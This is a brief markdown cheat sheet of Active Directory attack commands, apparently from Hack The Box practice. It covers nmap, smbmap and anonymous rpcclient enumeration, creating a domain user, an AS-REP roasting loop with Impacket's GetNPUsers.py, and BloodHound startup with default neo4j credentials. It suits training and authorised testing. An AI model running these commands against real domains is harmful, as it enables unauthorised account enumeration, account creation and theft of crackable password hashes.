### Nmap Scan 
- `nmap -p 53,135,139,88,389,445,464,593,636,3268,3269,5985,9389,49676,49696,49674,49675,49667,49666 -sV -sC -T16 -Pn -oA $IP $IP`

### Get Domain name
- `smbmap -H $IP`

### rpcclient
- `rpcclient -U "" -N $DOMAIN` Connect to rpcclient
- `enumdomusers` Enumerate Domain Users
-  `queryuser $RID` Enumerate User
- `enumdomgroups` Enumerate Domain Groups
- `getdomwinfo` Domain Password Information 
- `createdomuser $NAME` ,`setuserinfo2 $NAME 24 $PASSWORD` Creating Domain User

<!-- -->
[Enumerating AD with rpcclient](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)

### AS-REP roasting
AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authentication`

 EXPLOITING:
- put all user's in a file names `users.txt`
- `for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip $IP htb/${user} | grep -v Impacket; done` GetNPUsers is in impacket

### BloodHound
starting BloodHound
- `sudo neo4j console`
- `bloodhound`
 <!-- -->
 
 Credentials
- `Username: neo4j`
- `Password: BloodHound`

<!-- -->

### Misc
- `smbmap -H $IP` list Samba shares